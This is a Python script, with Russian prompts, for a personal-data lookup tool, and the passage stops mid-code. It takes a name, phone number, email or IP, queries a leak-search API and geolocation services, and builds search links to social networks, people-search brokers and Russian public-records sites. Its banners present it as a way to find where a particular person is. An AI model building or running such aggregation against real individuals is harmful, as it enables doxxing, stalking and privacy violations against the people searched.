import random, requests, json, re, logging, os, sys, time, glob, socket, csv, datetime, hashlib, webbrowser
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
from geopy.geocoders import Nominatim
from geopy.exc import GeocoderTimedOut, GeocoderServiceError
from collections import defaultdict
import urllib 
from urllib.parse import urlparse, quote_plus
from concurrent.futures import ThreadPoolExecutor
from pystyle import Colors, Box, Write, Center, Colorate, Anime
from difflib import get_close_matches
from pystyle import *
import wikipedia, pandas as pd
from termcolor import colored
from prettytable import PrettyTable
import asyncio, aiohttp, whois, dns.resolver
from time import sleep
from datetime import datetime
from rich.text import Text
from rich.live import Live
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
import pycountry
from itertools import repeat
init(autoreset=True); wikipedia.set_lang("ru"); os.system('cls' if os.name == 'nt' else 'clear')
def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(user_agents)

def send_osint_request(query, page=1):
    url = f'https://reveng.ee/api/search?q={query}&total=10000&page={page}&per_page=150&max_pages=20'
    headers = {'User-Agent': get_random_user_agent()}
    
    try:
        print(Fore.WHITE + f"Отправляем запрос на страницу {page}..." + Style.RESET_ALL)
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.Timeout:
        print(Fore.RED + "Request timed out. Try again later or check your internet connection." + Style.RESET_ALL)
        return None
    except requests.exceptions.HTTPError as err:
        print(Fore.RED + f"HTTP error occurred: {err}." + Style.RESET_ALL)
        return None
    except requests.exceptions.RequestException as err:
        print(Fore.RED + f"An error occurred during the request: {err}" + Style.RESET_ALL)
        return None
    except json.JSONDecodeError:
        print(Fore.RED + "Invalid JSON response from the API." + Style.RESET_ALL)
        return None

def fetch_results_with_multiple_pages(query):
    all_results = []
    page = 1
    max_pages = 20  
    while page <= max_pages:
        results = send_osint_request(query, page=page)
        if results and results.get('results'):
            all_results.extend(results['results'])
            page += 1
            if len(all_results) >= 4000000:
                print(Fore.YELLOW + "Достигнут лимит в 4 миллиона данных." + Style.RESET_ALL)
                break
        else:
            print(Fore.RED + "Нет дополнительных результатов или произошла ошибка." + Style.RESET_ALL)
            break
            
    return {'results': all_results}

def format_results(results):
    if results is None:
        return

    if results.get('results'):
        print(Fore.CYAN + "Search Results:" + Style.RESET_ALL)
        for entry in results['results']:
            properties = entry.get('properties', {})
            sources = entry.get('source', [])
            source_names = ', '.join((source['name'] for source in sources))

            print(Fore.YELLOW + f"\nID: {entry['id']}" + Style.RESET_ALL)
            print(Fore.YELLOW + f"Schema: {entry['schema']}" + Style.RESET_ALL)
            for key, value_list in properties.items():
                if value_list:
                    values = ', '.join(map(str, value_list))
                    print(Fore.YELLOW + f"├ {key.replace('_', ' ').title()}: {values}" + Style.RESET_ALL)
            print(Fore.YELLOW + f"Sources: {source_names}" + Style.RESET_ALL)
            print(Fore.YELLOW + "-" * 40 + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "Ничего не найдено." + Style.RESET_ALL)

def save_results_to_html(results, query):
    if results is None or not results.get('results'):
        print(Fore.RED + "Нет результатов для сохранения." + Style.RESET_ALL)
        return

    html_content = """
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>OSINT Search Results</title>
        <style>
            body {
                background-color: #121212;
                color: #e0e0e0;
                font-family: 'Courier New', Courier, monospace;
                margin: 0;
                padding: 20px;
                text-align: center;
            }
            h1 {
                color: #ff5733;
                font-size: 3em;
                margin-bottom: 30px;
                text-transform: uppercase;
                letter-spacing: 2px;
            }
            ul {
                list-style-type: none;
                padding: 0;
            }
            li {
                background-color: #1e1e1e;
                margin: 15px 0;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.7);
                transition: background-color 0.3s ease;
            }
            li:hover {
                background-color: #2c2c2c;
            }
            .key {
                font-weight: bold;
                color: #ffcc00;
            }
            .value {
                color: #ffffff;
            }
        </style>
    </head>
    <body>
    """

    count = len(results['results'])
    html_content += f"<h1>Результаты поиска для: {query} (Найдено: {count})</h1>"
    html_content += "<ul>"

    for entry in results['results']:
        properties = entry.get('properties', {})
        sources = entry.get('source', [])
        source_names = ', '.join((source['name'] for source in sources))

        html_content += "<li>"
        html_content += f"<span class='key'>ID:</span> <span class='value'>{entry['id']}</span><br>"
        html_content += f"<span class='key'>Schema:</span> <span class='value'>{entry['schema']}</span><br>"
        
        for key, value_list in properties.items():
            if value_list:
                values = ', '.join(map(str, value_list))
                html_content += f"<span class='key'>{key.replace('_', ' ').title()}:</span> <span class='value'>{values}</span><br>"
        
        html_content += f"<span class='key'>Sources:</span> <span class='value'>{source_names}</span><br>"
        html_content += "</li>"
    
    html_content += "</ul></body></html>"

    with open("osint_results_v1.html", "w", encoding="utf-8") as file:
        file.write(html_content)
    
    print(Fore.GREEN + "Результаты успешно сохранены в osint_results_v1.html" + Style.RESET_ALL)
def osinter():
    while True:
        print("Примеры: Иванов+Иван+Иванович, 79009009090, test@gmail.com")
        query = input(Fore.WHITE + "Введи запрос для осинт поиска: " + Style.RESET_ALL)
        query = query.strip()
        if not query:
            print(Fore.RED + "Запрос не может быть пустым!" + Style.RESET_ALL)
            continue
        
        results = fetch_results_with_multiple_pages(query)
        format_results(results)
        
        save_option = input(Fore.WHITE + "Хотите сохранить результаты в HTML? (y/n): " + Style.RESET_ALL).lower()
        if save_option == 'y':
            save_results_to_html(results, query)
    
def iplook():
    print(f'{Fore.RED}[{Fore.CYAN}IP{Fore.RED}]{Fore.WHITE}:')
    ipinp = input(f'    {Fore.RED}[{Fore.CYAN}?{Fore.RED}] {Fore.WHITE}Input IP {Fore.RED}here{Fore.WHITE}: ')
    print(f'    {Fore.RED}[{Fore.YELLOW}!{Fore.RED}] {Fore.WHITE}Searching information...')
    if (ipinp == ''):
        print(f'    {Fore.RED}[{Fore.RED}X{Fore.RED}] {Fore.RED}Нет такой Айпи адреса!')
        return
    request_url = f'https://ipapi.co/{ipinp}/json/'
    try:
        headers = {"User-Agent": "Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"}
        response = requests.get(request_url, headers=headers)
        if response.status_code == 200:
            ipvalues = response.json()
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}IP: {ipinp}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Network: {ipvalues["network"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Version: {ipvalues["version"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}City: {ipvalues["city"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Region: {ipvalues["region"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Region Code: {ipvalues["region_code"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country: {ipvalues["country"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country Name: {ipvalues["country_name"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country Code: {ipvalues["country_code"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country Code ISO3: {ipvalues["country_code_iso3"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country Capital: {ipvalues["country_capital"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country TLD: {ipvalues["country_tld"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Continent Code: {ipvalues["continent_code"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}In Europe: {ipvalues["in_eu"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Postal: {ipvalues["postal"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Latitude: {ipvalues["latitude"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Longitude: {ipvalues["longitude"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Timezone: {ipvalues["timezone"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}UTC Offset: {ipvalues["utc_offset"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country Phone Code: {ipvalues["country_calling_code"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Currency: {ipvalues["currency"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Currency Name: {ipvalues["currency_name"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Languages: {ipvalues["languages"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country Area: {ipvalues["country_area"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Country Population: {ipvalues["country_population"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}ASN: {ipvalues["asn"]}')
            print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Organisation: {ipvalues["org"]}')
        else:
            print(f'    {Fore.RED}[{Fore.RED}X{Fore.RED}] {Fore.RED}Response status: {response.status_code}. Failed to fetch data from ipapi.co.')
            return
    except requests.exceptions.SSLError as e:
        print(f'    {Fore.RED}[{Fore.RED}X{Fore.RED}] {Fore.RED}SSL Error: {e}')
    except KeyError as e:
        print(f'    {Fore.RED}[{Fore.RED}X{Fore.RED}] {Fore.RED}Failed to fetch {e}. Invalid IP.')
    print(f'    {Fore.RED}[{Fore.YELLOW}!{Fore.RED}] {Fore.WHITE}Searching information on whatismyipaddress.com...')
    print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}whatismyipaddress.com URL: https://whatismyipaddress.com/ip/{ipinp}')
    print(f'    {Fore.RED}[{Fore.YELLOW}!{Fore.RED}] {Fore.WHITE}Searching geolocation...')
    ipgeolocation = f'{ipvalues["latitude"]}+{ipvalues["longitude"]}'
    print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Google Maps URL: https://www.google.com/maps/search/{ipgeolocation}')
    geolocator = Nominatim(user_agent="Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148")
    location = geolocator.reverse(f'{ipvalues["latitude"]}, {ipvalues["longitude"]}')
    print(f'    {Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.WHITE}Address: {location.address}')
    
class HttpWebNumber:
    def __init__(self) -> None:
        self.check_number_link_1 = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.not_found_text = "Не найдено"
        self.social_networks = {
            "Одноклассники": "https://ok.ru/profile/{phone}",
            "ВКонтакте": "https://vk.com/search?c%5Bq%5D={phone}&c%5Bsection%5D=people",
            "Telegram": "https://t.me/{phone}",
            "Facebook": "https://www.facebook.com/search/top?q={phone}",
            "Instagram": "https://www.instagram.com/{phone}",
            "Twitter": "https://twitter.com/{phone}",
            "LinkedIn": "https://www.linkedin.com/search/results/people/?keywords={phone}",
            "YouTube": "https://www.youtube.com/results?search_query={phone}",
            "WhatsApp": "https://wa.me/{phone}",
            "Pinterest": "https://www.pinterest.com/search/pins/?q={phone}",
            "Snapchat": "https://www.snapchat.com/add/{phone}",
            "Reddit": "https://www.reddit.com/search?q={phone}",
            "TikTok": "https://www.tiktok.com/@{phone}",
            "Tumblr": "https://www.tumblr.com/search/{phone}",
            "Skype": "https://join.skype.com/{phone}"
        }
    def return_number_data_1(self, user_number: str) -> dict:
        try:
            response = requests.get(self.check_number_link_1 + user_number, headers={
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15"
            })
            if response.ok:
                return response.json()
            else:
                return {"status_error": True}
        except requests.exceptions.ConnectionError:
            return {"status_error": True, "message": "Проблемы с подключением."}
        except requests.exceptions.RequestException as e:
            return {"status_error": True, "message": str(e)}
    def get_number_info(self, user_number: str) -> str:
        data_1 = self.return_number_data_1(user_number)
        if data_1.get("status_error"):
            return f"{Fore.RED}Ошибка при получении данных."
        output = []
        output.append(f"{Fore.GREEN}{Style.BRIGHT}===============================")
        output.append(f"{Fore.RED}{Style.BRIGHT}[+] ПРОВЕРКА НОМЕРА: {user_number}")
        output.append(f"{Fore.GREEN}{Style.BRIGHT}===============================")
        country = data_1.get("country", {})
        output.append(f"{Fore.YELLOW}[+] Информация о стране:\n")
        if country:
            for key, value in country.items():
                output.append(f" {Fore.WHITE}  {key.capitalize()}: {value if value else self.not_found_text}")
        else:
            output.append(f"{Fore.RED}Нет информации о стране.\n")
        region = data_1.get("region", {})
        output.append(f"{Fore.YELLOW}[+] Информация о регионе:\n")
        if region:
            for key, value in region.items():
                output.append(f"{Fore.WHITE}  {key.capitalize()}: {value if value else self.not_found_text}")
        else:
            output.append(f"{Fore.RED}Нет информации о регионе.\n")
        rajon = data_1.get("rajon", {})
        output.append(f"{Fore.YELLOW}[+] Информация о районе:\n")
        if rajon:
            for key, value in rajon.items():
                output.append(f" {Fore.WHITE}  {key.capitalize()}: {value if value else self.not_found_text}")
        else:
            output.append(f"{Fore.RED}Нет информации о районе.\n")
        output.append(f"{Fore.YELLOW}[+] Информация о городе:\n")
        city_info = {
            "Город": data_1.get("city", ""),
            "Телефонный код города": data_1.get("city_telcod", ""),
            "Широта": data_1.get("latitude", ""),
            "Долгота": data_1.get("longitude", ""),
            "Часовой пояс": data_1.get("tz", "")
        }
        for key, value in city_info.items():
            output.append(f" {Fore.WHITE}  {key}: {value if value else self.not_found_text}")
        capital = data_1.get("capital", {})
        output.append(f"\n{Fore.YELLOW}[+] Информация о столице:\n")
        if capital:
            for key, value in capital.items():
                output.append(f"{Fore.WHITE}  {key.capitalize()}: {value if value else self.not_found_text}") 
        else:
            output.append("Нет информации о столице.\n")
        output.append(f"{Fore.YELLOW} [+] Информация об операторе:\n")
        operator_info = data_1.get("0", {})
        if operator_info:
            operator = operator_info.get("oper", self.not_found_text)
            output.append(f"{Fore.YELLOW} Оператор: {operator}")
            for key, value in operator_info.items():
                if key != "oper":
                    output.append(f" {Fore.WHITE}  {key.capitalize()}: {value if value else self.not_found_text}")
        else:
            output.append(f"{Fore.RED}Нет информации об операторе.\n")
        output.append(f"\n{Fore.CYAN}{Style.BRIGHT}[-] ЛОМАНИЕ ПОИСКОВИКОВ НАМ ПОМОЖЕТ:")
        search_engines = {
            "Google": f"https://www.google.com/search?q={user_number}",
            "Bing": f"https://www.bing.com/search?q={user_number}",
            "Yahoo": f"https://search.yahoo.com/search?p={user_number}",
            "Yandex": f"https://yandex.ru/search/?text={user_number}",
            "DuckDuckGo": f"https://duckduckgo.com/?q={user_number}",
            "Ecosia": f"https://www.ecosia.org/search?q={user_number}",
        }
        for engine, url in search_engines.items():
            output.append(f"   {Fore.MAGENTA}{engine}: {url}")
        output.append(f"\n{Fore.CYAN}{Style.BRIGHT}[-] СОЦИАЛЬНЫЕ СЕТИ... ЭТО ГДЕ ОН:")
        for platform, url in self.social_networks.items():
            output.append(f"   {Fore.MAGENTA}{platform}: {url.format(phone=user_number)}")
        return "\n".join(output)
def display_scan_results(phone: str):
    http_info = HttpWebNumber()
    result = http_info.get_number_info(phone)
    print(f"{Fore.WHITE}{result}")

def phone_osint():
    print(f"{Fore.GREEN}{Style.BRIGHT}===============================")
    print(f"{Fore.RED}{Style.BRIGHT}   Dangerous Phone Number Checker ")
    print(f"{Fore.YELLOW}{Style.BRIGHT}     Created by: Sakuta     ")
    print(f"{Fore.GREEN}{Style.BRIGHT}===============================")
    phone_number = input(f"{Fore.YELLOW}{Style.BRIGHT}Введите номер телефона для проверки: ")
    display_scan_results(phone_number)
 
def search_and_extract(query):
    results = []
    search_engines = [
        ("https://www.google.com/search?q=", "Google"),
        ("https://www.bing.com/search?q=", "Bing"),
        ("https://duckduckgo.com/?q=", "DuckDuckGo"),
        ("https://www.yandex.ru/search/?text=", "Yandex"),
        ("https://www.ecosia.org/search?q=", "Ecosia"),
        ("https://search.yahoo.com/search?p=", "Yahoo"),
        ("https://www.ask.com/web?q=", "Ask"),
        ("https://www.wolframalpha.com/input/?i=", "Wolfram Alpha"),
        ("https://www.baidu.com/s?wd=", "Baidu"),
        ("https://www.ask.com/web?q=", "Ask"),
        ("https://www.aol.com/search?q=", "AOL"),
        ("https://www.excite.com/search/?q=", "Excite"),
        ("https://www.lycos.com/web/search?q=", "Lycos"),
        ("https://www.metacrawler.com/search?q=", "MetaCrawler"),
        ("https://www.webcrawler.com/search?q=", "WebCrawler"),
        ("https://www.dogpile.com/search?q=", "Dogpile"),
        ("https://search.seznam.cz/search?q=", "Seznam"),
        ("https://www.startpage.com/do/search?q=", "Startpage"),
        ("https://www.qwant.com/search?q=", "Qwant"),
        ("https://www.swisscows.com/en/search?query=", "Swisscows"),
        ("https://www.gibiru.com/search?q=", "Gibiru"),
        ("https://www.duckduckgo.com/?q=", "DuckDuckGo"),
        ("https://www.aport.ru/search/", "Aport"),
        ("https://www.rambler.ru/search/", "Rambler"),
        ("https://www.nigma.ru/search/", "Nigma"),
        ("https://www.sber.ru/search/", "SberSearch"),
    ]

    social_networks = [
        ("https://www.facebook.com/search/top/?q=", "Facebook"),
        ("https://twitter.com/search?q=", "Twitter"),
        ("https://www.instagram.com/explore/tags/", "Instagram"),
        ("https://www.linkedin.com/in/", "LinkedIn"),
        ("https://vk.com/search?c%5Bsection%5D=people&q=", "VK"),
        ("https://ok.ru/dk?st.cmd=userSearch&st.q=", "Одноклассники"),
        ("https://t.me/s/", "Telegram"),
        ("https://www.youtube.com/results?search_query=", "YouTube"),
        ("https://www.reddit.com/search?q=", "Reddit"),
        ("https://www.pinterest.com/search/pins/?q=", "Pinterest"),
        ("https://www.tiktok.com/search/", "TikTok"),
        ("https://www.tumblr.com/search/", "Tumblr"),
        ("https://www.myspace.com/search/", "MySpace"),
        ("https://www.snapchat.com/add/", "Snapchat"),
        ("https://www.discord.com/invite/", "Discord"),
        ("https://www.livejournal.com/users/search?q=", "LiveJournal"),
        ("https://www.mewe.com/search/", "MeWe"),
        ("https://www.diaspora.com/directory/", "Diaspora"),
        ("https://www.mastodon.social/web/accounts/search?q=", "Mastodon"),
        ("https://www.gab.com/search/", "Gab"),
        ("https://www.parler.com/search/", "Parler"),
        ("https://www.minds.com/discover/people/", "Minds"),
        ("https://www.telegram.me/s/", "Telegram"),
        ("https://www.whatsapp.com/search/", "WhatsApp"),
        ("https://www.signal.org/search/", "Signal"),
        ("https://www.wire.com/en/search", "Wire"),
        ("https://www.vkontakte.ru/search/", "ВКонтакте"),
        ("https://www.odnoklassniki.ru/search/", "Одноклассники"),
        ("https://www.moikrug.ru/search/", "Мой Круг"),
        ("https://www.linkedin.com/sales/search/", "LinkedIn Sales Navigator"),
        ("https://www.twitter.com/search/", "Twitter"),
        ("https://www.facebook.com/search/", "Facebook"),
    ]

    people_search_engines = [
        ("https://www.google.com/search?q=", "Google People Search"),
        ("https://www.pipl.com/search/?q=", "Pipl"),
        ("https://www.spokeo.com/search/people/", "Spokeo"),
        ("https://www.WHITEpages.com/people/", "WHITEpages"),
        ("https://www.truepeoplesearch.com/people/", "TruePeopleSearch"),
        ("https://www.beenverified.com/people-search/", "BeenVerified"),
        ("https://www.intelius.com/people-search/", "Intelius"),
        ("https://www.zabasearch.com/people/", "ZabaSearch"),
        ("https://www.fastpeoplesearch.com/", "FastPeopleSearch"),
        ("https://www.radaris.com/", "Radaris"),
        ("https://www.peekyou.com/", "PeekYou"),
        ("https://www.peoplelookup.com/", "PeopleLookup"),
        ("https://www.findfamily.com/", "FindFamily"),
        ("https://www.familytreenow.com/", "FamilyTreeNow"),
        ("https://www.WHITEpages.com/people/", "WHITEpages"),
        ("https://www.spokeo.com/search/", "Spokeo"),
    ]

    public_records_engines = [
        ("https://www.rusprofile.ru/search/", "Rusprofile"),
        ("https://www.zakon.ru/search/", "Zakon.ru"),
        ("https://www.rosreestr.ru/wps/portal/pkk5/!", "Rosreestr"),
        ("https://www.nalog.ru/", "Federal Tax Service"),
        ("https://www.garant.ru/search/", "Garant"),
        ("https://www.consultant.ru/search/", "Consultant.ru"),
        ("https://www.mos.ru/search/", "Moscow Government Portal"),
        ("https://www.spb.ru/search/", "Saint Petersburg Government Portal"),
        ("https://www.fssp.gov.ru/", "Federal Bailiffs Service"),
        ("https://www.e-kontur.ru/kontur-focus/", "Kontur Focus"),
        ("https://www.spark-interfax.ru/search.html", "Spark Interfax"),
        ("https://www.rospravo.ru/search/", "RosPravo"),
        ("https://www.rosminzdrav.ru/search/", "Ministry of Health of Russia"),
        ("https://www.rostec.ru/search/", "Rostec State Corporation"),
        ("https://www.nalog.ru/rn77/service/fiz_v_kontur/index.html", "Federal Tax Service Moscow"),
        ("https://www.mos.ru/ds/prefectures/", "Moscow Prefectures"),
        ("https://www.gosuslugi.ru/", "Gosuslugi"),
        ("https://www.zakupki.gov.ru/", "Public Procurement"),
        ("https://www.rkn.gov.ru/", "Roskomnadzor"),
        ("https://www.gubkin.ru/", "Gubkin University"),
        ("https://www.msu.ru/", "Moscow State University"),
        ("https://www.spbu.ru/", "Saint Petersburg State University"),
        ("https://www.mephi.ru/", "Moscow Engineering Physics Institute"),
        ("https://www.hse.ru/", "Higher School of Economics"),
        # Поиск по номеру телефона
        ("https://www.google.com/search?q=", "Google Phone Search"),
        ("https://www.yandex.ru/search/?text=", "Yandex Phone Search"),
        ("https://www.bing.com/search?q=", "Bing Phone Search"),
        ("https://www.pipl.com/search/?q=", "Pipl Phone Search"),
        ("https://www.spokeo.com/search/people/", "Spokeo Phone Search"),
        ("https://www.WHITEpages.com/people/", "WHITEpages Phone Search"),
        ("https://www.truepeoplesearch.com/people/", "TruePeopleSearch Phone Search"),
        ("https://www.beenverified.com/people-search/", "BeenVerified Phone Search"),
        ("https://www.intelius.com/people-search/", "Intelius Phone Search"),
        ("https://www.zabasearch.com/people/", "ZabaSearch Phone Search"),
        ("https://www.fastpeoplesearch.com/", "FastPeopleSearch Phone Search"),
        ("https://www.radaris.com/", "Radaris Phone Search"),
        ("https://www.peekyou.com/", "PeekYou Phone Search"),
        ("https://www.peoplelookup.com/", "PeopleLookup Phone Search"),
        # Поиск по ФИО
        ("https://www.google.com/search?q=", "Google Name Search"),
        ("https://www.yandex.ru/search/?text=", "Yandex Name Search"),
        ("https://www.bing.com/search?q=", "Bing Name Search"),
        ("https://www.pipl.com/search/?q=", "Pipl Name Search"),
        ("https://www.spokeo.com/search/people/", "Spokeo Name Search"),
        ("https://www.WHITEpages.com/people/", "WHITEpages Name Search"),
        ("https://www.truepeoplesearch.com/people/", "TruePeopleSearch Name Search"),
        ("https://www.beenverified.com/people-search/", "BeenVerified Name Search"),
        ("https://www.intelius.com/people-search/", "Intelius Name Search"),
        ("https://www.zabasearch.com/people/", "ZabaSearch Name Search"),
        ("https://www.fastpeoplesearch.com/", "FastPeopleSearch Name Search"),
        ("https://www.radaris.com/", "Radaris Name Search"),
        ("https://www.peekyou.com/", "PeekYou Name Search"),
        ("https://www.peoplelookup.com/", "PeopleLookup Name Search"),
        # Поиск по почте
        ("https://www.google.com/search?q=", "Google Email Search"),
        ("https://www.yandex.ru/search/?text=", "Yandex Email Search"),
        ("https://www.bing.com/search?q=", "Bing Email Search"),
        ("https://www.pipl.com/search/?q=", "Pipl Email Search"),
        ("https://www.spokeo.com/search/people/", "Spokeo Email Search"),
        ("https://www.WHITEpages.com/people/", "WHITEpages Email Search"),
        ("https://www.truepeoplesearch.com/people/", "TruePeopleSearch Email Search"),
        ("https://www.beenverified.com/people-search/", "BeenVerified Email Search"),
        ("https://www.intelius.com/people-search/", "Intelius Email Search"),
        ("https://www.zabasearch.com/people/", "ZabaSearch Email Search"),
        ("https://www.fastpeoplesearch.com/", "FastPeopleSearch Email Search"),
        ("https://www.radaris.com/", "Radaris Email Search"),
        ("https://www.peekyou.com/", "PeekYou Email Search"),
        ("https://www.peoplelookup.com/", "PeopleLookup Email Search"),
        # Поиск по адресу
        ("https://www.google.com/search?q=", "Google Address Search"),
        ("https://www.yandex.ru/search/?text=", "Yandex Address Search"),
        ("https://www.bing.com/search?q=", "Bing Address Search"),
        ("https://www.pipl.com/search/?q=", "Pipl Address Search"),
        ("https://www.spokeo.com/search/people/", "Spokeo Address Search"),
        ("https://www.WHITEpages.com/people/", "WHITEpages Address Search"),
        ("https://www.truepeoplesearch.com/people/", "TruePeopleSearch Address Search"),
        ("https://www.beenverified.com/people-search/", "BeenVerified Address Search"),
        ("https://www.intelius.com/people-search/", "Intelius Address Search"),
        ("https://www.zabasearch.com/people/", "ZabaSearch Address Search"),
        ("https://www.fastpeoplesearch.com/", "FastPeopleSearch Address Search"),
        ("https://www.radaris.com/", "Radaris Address Search"),
        ("https://www.peekyou.com/", "PeekYou Address Search"),
        ("https://www.peoplelookup.com/", "PeopleLookup Address Search"),
    ]

    for engine_url, engine_name in (search_engines + social_networks +
                                     people_search_engines + public_records_engines):
        url = engine_url + query
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')

                search_results = soup.find_all('div', class_='g')
                search_results_bing = soup.find_all('li', class_='b_algo')
                search_results_yandex = soup.find_all('div', class_='serp-item__content')
                search_results_pipl = soup.find_all('div', class_='search-result')
                search_results_spokeo = soup.find_all('div', class_='person-card')
                search_results_WHITEpages = soup.find_all('div', class_='search-result')
                search_results_truepeoplesearch = soup.find_all('div', class_='people-results')
                search_results_familysearch = soup.find_all('div', class_='search-result')
                search_results_ussearch = soup.find_all('div', class_='search-result')
                search_results_genealogybank = soup.find_all('div', class_='search-result')
                search_results_findagrave = soup.find_all('div', class_='search-result')
                search_results_archives = soup.find_all('div', class_='search-result')
                search_results_census = soup.find_all('div', class_='search-result')
                search_results_courtlistener = soup.find_all('div', class_='search-result')
                search_results_casetext = soup.find_all('div', class_='search-result')
                search_results_muckrack = soup.find_all('div', class_='search-result')
                search_results_zoominfo = soup.find_all('div', class_='search-result')
                search_results_crunchbase = soup.find_all('div', class_='search-result')
                search_results_glassdoor = soup.find_all('div', class_='search-result')
                search_results_linkedin_sales = soup.find_all('div', class_='search-result')
                search_results_yellowpages = soup.find_all('div', class_='search-result')
                search_results_bizapedia = soup.find_all('div', class_='search-result')
                search_results_dnb = soup.find_all('div', class_='search-result')
                search_results_rusprofile = soup.find_all('div', class_='search-result')
                search_results_zakon = soup.find_all('div', class_='search-result')
                search_results_rosreestr = soup.find_all('div', class_='search-result')
                search_results_nalog = soup.find_all('div', class_='search-result')
                search_results_garant = soup.find_all('div', class_='search-result')
                search_results_consultant = soup.find_all('div', class_='search-result')
                search_results_mos = soup.find_all('div', class_='search-result')
                search_results_spb = soup.find_all('div', class_='search-result')
                search_results_fssp = soup.find_all('div', class_='search-result')
                search_results_ekontur = soup.find_all('div', class_='search-result')
                search_results_spark = soup.find_all('div', class_='search-result')
                search_results_rospravo = soup.find_all('div', class_='search-result')
                search_results_rosminzdrav = soup.find_all('div', class_='search-result')
                search_results_rostec = soup.find_all('div', class_='search-result')
                search_results_nalog_moscow = soup.find_all('div', class_='search-result')
                search_results_mos_prefectures = soup.find_all('div', class_='search-result')
                search_results_gosuslugi = soup.find_all('div', class_='search-result')
                search_results_zakupki = soup.find_all('div', class_='search-result')
                search_results_rkn = soup.find_all('div', class_='search-result')
                search_results_gubkin = soup.find_all('div', class_='search-result')
                search_results_msu = soup.find_all('div', class_='search-result')
                search_results_spbu = soup.find_all('div', class_='search-result')
                search_results_mephi = soup.find_all('div', class_='search-result')
                search_results_hse = soup.find_all('div', class_='search-result')

                for result in (search_results + search_results_bing + search_results_yandex +
                               search_results_pipl + search_results_spokeo +
                               search_results_WHITEpages + search_results_truepeoplesearch +
                               search_results_familysearch + search_results_ussearch +
                               search_results_genealogybank + search_results_findagrave +
                               search_results_archives + search_results_census +
                               search_results_courtlistener + search_results_casetext +
                               search_results_muckrack + search_results_zoominfo +
                               search_results_crunchbase + search_results_glassdoor +
                               search_results_linkedin_sales + search_results_yellowpages +
                               search_results_bizapedia + search_results_dnb +
                               search_results_rusprofile + search_results_zakon +
